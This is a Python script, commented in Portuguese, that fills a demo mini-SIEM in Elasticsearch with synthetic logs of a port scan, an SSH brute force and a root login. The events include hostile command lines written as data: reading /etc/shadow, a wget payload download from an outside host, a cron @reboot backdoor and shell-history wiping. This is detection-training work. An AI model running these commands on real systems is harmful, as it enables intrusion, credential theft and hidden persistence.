#!/usr/bin/env python3
"""
inject_demo_data.py — Injeção de dados de demonstração para o mini-SIEM
=======================================================================

Simula o incidente completo em 3 fases:
  Fase 1 — Port Scan   : varredura Nmap-like de 1.500 portas (~2 min de janela)
  Fase 2 — Brute Force : 320 tentativas de login SSH falhas no mesmo IP
  Fase 3 — Acesso      : login SSH bem-sucedido + lateral movement simulado

Os eventos são inseridos com timestamps retroativos para montar uma
timeline coerente de ~15 minutos de incidente.

Uso:
    python inject_demo_data.py \
        --es-host https://localhost:9200 \
        --es-user elastic \
        --es-password SenhaElastic123! \
        --ca-cert ./certs/ca/ca.crt

    # Sem TLS (apenas para teste local sem Docker):
    python inject_demo_data.py --no-tls
"""

import argparse
import json
import random
import sys
import time
from datetime import datetime, timedelta, timezone

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ──────────────────────────────────────────────
# CONFIGURAÇÃO DO CENÁRIO
# ──────────────────────────────────────────────

ATTACKER_IP   = "45.33.32.156"       # IP público real (Scanme.nmap.org — uso didático)
ATTACKER_GEO  = {                     # coordenadas injetadas manualmente (GeoIP mockado)
    "location": {"lat": 37.3382, "lon": -121.8863},
    "country_name": "United States",
    "city_name": "San Jose",
    "region_name": "California",
}
VICTIM_IP     = "192.168.0.10"
VICTIM_HOST   = "srv-web-01"

# Portas varridas na fase 1 (mistura de comuns + incomuns, típico de Nmap -sS)
SCANNED_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
    993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 8888,
    *random.sample(range(1024, 65535), 1478),   # completa 1500 portas
]

SSH_USERS = ["root", "admin", "ubuntu", "pi", "user", "test", "oracle", "postgres"]
SSH_PASS_ATTEMPTS = 320

INCIDENT_START = datetime.now(timezone.utc) - timedelta(minutes=25)  # 25 min atrás


# ──────────────────────────────────────────────
# HELPERS
# ──────────────────────────────────────────────

def ts(base: datetime, delta_seconds: float) -> str:
    return (base + timedelta(seconds=delta_seconds)).isoformat()


def bulk_index(session, es_host, index: str, docs: list, ca_cert, verify):
    """Envia documentos via _bulk API do Elasticsearch."""
    lines = []
    for doc in docs:
        lines.append(json.dumps({"index": {"_index": index}}))
        lines.append(json.dumps(doc))
    body = "\n".join(lines) + "\n"
    resp = session.post(
        f"{es_host}/_bulk",
        data=body.encode("utf-8"),
        headers={"Content-Type": "application/x-ndjson"},
        verify=verify,
        timeout=30,
    )
    resp.raise_for_status()
    result = resp.json()
    errors = [i for i in result.get("items", []) if "error" in i.get("index", {})]
    if errors:
        print(f"  ⚠  {len(errors)} erros no bulk (primeiros 3): {errors[:3]}")
    return len(docs) - len(errors)


def put_index_template(session, es_host, verify):
    """Cria um template de índice com mapeamento geo_point para os campos de geolocalização."""
    template = {
        "index_patterns": ["siem-*"],
        "template": {
            "mappings": {
                "properties": {
                    "source": {
                        "properties": {
                            "ip": {"type": "ip"},
                            "port": {"type": "integer"},
                            "geo": {
                                "properties": {
                                    "location": {"type": "geo_point"},
                                    "country_name": {"type": "keyword"},
                                    "city_name": {"type": "keyword"},
                                    "region_name": {"type": "keyword"},
                                }
                            },
                        }
                    },
                    "destination": {
                        "properties": {
                            "ip": {"type": "ip"},
                            "port": {"type": "integer"},
                        }
                    },
                    "@timestamp": {"type": "date"},
                    "event": {
                        "properties": {
                            "category": {"type": "keyword"},
                            "type": {"type": "keyword"},
                            "outcome": {"type": "keyword"},
                            "severity": {"type": "keyword"},
                            "module": {"type": "keyword"},
                        }
                    },
                    "tags": {"type": "keyword"},
                    "rule": {
                        "properties": {
                            "id": {"type": "keyword"},
                            "description": {"type": "text"},
                        }
                    },
                    "unique_ports_count": {"type": "integer"},
                    "syn_count": {"type": "integer"},
                    "failed_login_count": {"type": "integer"},
                    "user": {
                        "properties": {"name": {"type": "keyword"}}
                    },
                    "process": {
                        "properties": {
                            "name": {"type": "keyword"},
                            "command_line": {"type": "text"},
                        }
                    },
                }
            }
        },
        "priority": 200,
    }
    r = session.put(
        f"{es_host}/_index_template/siem-demo-template",
        json=template,
        verify=verify,
        timeout=10,
    )
    r.raise_for_status()
    print("  ✓ Index template 'siem-demo-template' criado/atualizado")


# ──────────────────────────────────────────────
# FASE 1 — PORT SCAN
# ──────────────────────────────────────────────

def generate_portscan_events():
    """Gera 1 evento de alerta de port scan + eventos individuais de SYN."""
    events = []
    phase_start = INCIDENT_START

    # Evento agregado (o que o Logstash geraria depois da janela de 20s)
    alert = {
        "@timestamp": ts(phase_start, 22),
        "tags": ["tcp_syn", "port_scan_detected", "custom_json"],
        "event": {
            "kind": "alert",
            "category": "intrusion_detection",
            "type": "reconnaissance",
            "module": "custom",
            "severity": "high",
        },
        "source": {
            "ip": ATTACKER_IP,
            "port": random.randint(40000, 60000),
            "geo": ATTACKER_GEO,
        },
        "destination": {"ip": VICTIM_IP},
        "rule": {
            "id": "PORTSCAN-001",
            "description": "Multiplas portas distintas do mesmo IP em janela curta (possivel Nmap scan)",
        },
        "unique_ports_count": len(SCANNED_PORTS),
        "network": {"transport": "tcp"},
        "observer": {"hostname": VICTIM_HOST},
        "message": f"Port scan detectado: {ATTACKER_IP} varreu {len(SCANNED_PORTS)} portas em 22s",
    }
    events.append(("siem-alerts", alert))

    # Eventos individuais de SYN (amostra de 200 para não sobrecarregar)
    sample_ports = random.sample(SCANNED_PORTS, min(200, len(SCANNED_PORTS)))
    for i, port in enumerate(sample_ports):
        ev = {
            "@timestamp": ts(phase_start, i * 0.11),
            "tags": ["tcp_syn", "custom_json"],
            "event": {
                "kind": "event",
                "category": "network",
                "type": "connection",
                "action": "connection_attempt",
                "module": "custom",
            },
            "source": {
                "ip": ATTACKER_IP,
                "port": random.randint(40000, 60000),
                "geo": ATTACKER_GEO,
            },
            "destination": {"ip": VICTIM_IP, "port": port},
            "network": {"transport": "tcp"},
            "tcp": {"flags": {"syn": True, "ack": False}},
            "observer": {"hostname": VICTIM_HOST},
            "message": f"SYN {ATTACKER_IP}:{random.randint(40000,60000)} → {VICTIM_IP}:{port}",
        }
        events.append(("siem-custom", ev))

    return events


# ──────────────────────────────────────────────
# FASE 2 — SSH BRUTE FORCE
# ──────────────────────────────────────────────

def generate_bruteforce_events():
    events = []
    phase_start = INCIDENT_START + timedelta(minutes=5)

    for i in range(SSH_PASS_ATTEMPTS):
        user = random.choice(SSH_USERS)
        ev = {
            "@timestamp": ts(phase_start, i * 1.8),  # ~3 tentativas/s
            "tags": ["syslog", "ssh", "brute_force"],
            "event": {
                "kind": "event",
                "category": "authentication",
                "type": "start",
                "outcome": "failure",
                "module": "syslog",
                "severity": "medium",
            },
            "source": {
                "ip": ATTACKER_IP,
                "port": random.randint(40000, 60000),
                "geo": ATTACKER_GEO,
            },
            "destination": {"ip": VICTIM_IP, "port": 22},
            "user": {"name": user},
            "network": {"transport": "tcp"},
            "syslog_program": "sshd",
            "observer": {"hostname": VICTIM_HOST},
            "message": f"Failed password for invalid user {user} from {ATTACKER_IP} port {random.randint(40000,60000)} ssh2",
        }
        events.append(("siem-syslog", ev))

    # Alerta agregado de brute force (resumo dos 320 eventos)
    alert = {
        "@timestamp": ts(phase_start, SSH_PASS_ATTEMPTS * 1.8),
        "tags": ["syslog", "ssh", "brute_force_alert"],
        "event": {
            "kind": "alert",
            "category": "authentication",
            "type": "start",
            "outcome": "failure",
            "module": "syslog",
            "severity": "critical",
        },
        "source": {
            "ip": ATTACKER_IP,
            "geo": ATTACKER_GEO,
        },
        "destination": {"ip": VICTIM_IP, "port": 22},
        "rule": {
            "id": "BRUTE-SSH-001",
            "description": "Alto volume de falhas de autenticação SSH do mesmo IP",
        },
        "failed_login_count": SSH_PASS_ATTEMPTS,
        "observer": {"hostname": VICTIM_HOST},
        "message": f"SSH brute force detectado: {SSH_PASS_ATTEMPTS} tentativas de {ATTACKER_IP} em ~10 min",
    }
    events.append(("siem-alerts", alert))

    return events


# ──────────────────────────────────────────────
# FASE 3 — LOGIN COM SUCESSO + LATERAL MOVEMENT
# ──────────────────────────────────────────────

def generate_intrusion_events():
    events = []
    phase_start = INCIDENT_START + timedelta(minutes=16)

    # Login SSH bem-sucedido
    ev_login = {
        "@timestamp": ts(phase_start, 0),
        "tags": ["syslog", "ssh", "successful_login"],
        "event": {
            "kind": "event",
            "category": "authentication",
            "type": "start",
            "outcome": "success",
            "module": "syslog",
            "severity": "critical",
        },
        "source": {
            "ip": ATTACKER_IP,
            "port": random.randint(40000, 60000),
            "geo": ATTACKER_GEO,
        },
        "destination": {"ip": VICTIM_IP, "port": 22},
        "user": {"name": "root"},
        "network": {"transport": "tcp"},
        "syslog_program": "sshd",
        "observer": {"hostname": VICTIM_HOST},
        "message": f"Accepted password for root from {ATTACKER_IP} port {random.randint(40000,60000)} ssh2",
    }
    events.append(("siem-alerts", ev_login))

    # Comandos executados após o login (lateral movement)
    commands = [
        ("whoami",         "whoami"),
        ("uname",          "uname -a"),
        ("cat_passwd",     "cat /etc/passwd"),
        ("cat_shadow",     "cat /etc/shadow"),
        ("wget",           "wget http://45.33.32.156/payload.sh -O /tmp/.x"),
        ("chmod",          "chmod +x /tmp/.x"),
        ("cron_backdoor",  "(crontab -l 2>/dev/null; echo '@reboot /tmp/.x') | crontab -"),
        ("netstat",        "netstat -anltp"),
        ("ss",             "ss -tulpn"),
        ("history_clear",  "history -c && cat /dev/null > ~/.bash_history"),
    ]
    for i, (name, cmd) in enumerate(commands):
        ev_cmd = {
            "@timestamp": ts(phase_start, 30 + i * 45),
            "tags": ["syslog", "process", "post_exploitation"],
            "event": {
                "kind": "event",
                "category": "process",
                "type": "start",
                "outcome": "success",
                "module": "syslog",
                "severity": "critical",
            },
            "source": {"ip": ATTACKER_IP, "geo": ATTACKER_GEO},
            "user": {"name": "root"},
            "process": {"name": name, "command_line": cmd},
            "observer": {"hostname": VICTIM_HOST},
            "message": f"[AUDITD] uid=0 comm={name!r} cmd={cmd!r}",
        }
        events.append(("siem-alerts", ev_cmd))

    return events


# ──────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Injetor de dados de demo para mini-SIEM")
    parser.add_argument("--es-host",     default="https://localhost:9200")
    parser.add_argument("--es-user",     default="elastic")
    parser.add_argument("--es-password", default="SenhaElastic123!")
    parser.add_argument("--ca-cert",     default=None, help="Caminho para o CA cert (TLS)")
    parser.add_argument("--no-tls",      action="store_true", help="Desativa verificação TLS (sem Docker)")
    args = parser.parse_args()

    if args.no_tls:
        verify = False
        es_host = args.es_host.replace("https://", "http://")
    elif args.ca_cert:
        verify = args.ca_cert
        es_host = args.es_host
    else:
        verify = False
        es_host = args.es_host

    session = requests.Session()
    session.auth = (args.es_user, args.es_password)

    print(f"\n🔍 Conectando ao Elasticsearch em {es_host}...")
    try:
        r = session.get(f"{es_host}/_cluster/health", verify=verify, timeout=10)
        r.raise_for_status()
        status = r.json().get("status", "?")
        print(f"  ✓ Cluster status: {status}")
    except Exception as e:
        print(f"  ✗ Falha ao conectar: {e}")
        print("  Dica: rode 'docker-compose up -d' primeiro e aguarde ~2 min")
        sys.exit(1)

    print("\n📐 Criando index template com mapeamento geo_point...")
    try:
        put_index_template(session, es_host, verify)
    except Exception as e:
        print(f"  ⚠ Template falhou (continuando): {e}")

    all_events = []
    print("\n⚙  Gerando eventos do incidente...")

    print("  [Fase 1] Port Scan   ...")
    all_events.extend(generate_portscan_events())

    print("  [Fase 2] Brute Force SSH ...")
    all_events.extend(generate_bruteforce_events())

    print("  [Fase 3] Login + Lateral Movement ...")
    all_events.extend(generate_intrusion_events())

    # Agrupa por índice e envia em lotes de 500
    from collections import defaultdict
    by_index = defaultdict(list)
    for index_prefix, doc in all_events:
        today = datetime.now(timezone.utc).strftime("%Y.%m.%d")
        by_index[f"{index_prefix}-{today}"].append(doc)

    print(f"\n📤 Indexando {len(all_events)} documentos no Elasticsearch...")
    total_ok = 0
    for index, docs in by_index.items():
        chunk_size = 500
        for i in range(0, len(docs), chunk_size):
            chunk = docs[i:i+chunk_size]
            ok = bulk_index(session, es_host, index, chunk, args.ca_cert, verify)
            total_ok += ok
        print(f"  ✓ {index} → {len(docs)} docs")

    print(f"\n✅ Pronto! {total_ok} documentos indexados com sucesso.")
    print(f"\n📊 Abra o Kibana em http://localhost:5601")
    print("   → Stack Management → Index Patterns → Criar 'siem-*'")
    print("   → Analytics → Dashboard → Importar o arquivo kibana_dashboard.ndjson")
    print(f"\n🕐 Timeline do incidente simulado:")
    print(f"   {INCIDENT_START.strftime('%H:%M:%S')} — Início do Port Scan ({len(SCANNED_PORTS)} portas)")
    print(f"   {(INCIDENT_START + timedelta(minutes=5)).strftime('%H:%M:%S')} — Início Brute Force SSH ({SSH_PASS_ATTEMPTS} tentativas)")
    print(f"   {(INCIDENT_START + timedelta(minutes=16)).strftime('%H:%M:%S')} — Login root bem-sucedido")
    print(f"   {(INCIDENT_START + timedelta(minutes=24)).strftime('%H:%M:%S')} — Backdoor instalada")


if __name__ == "__main__":
    main()
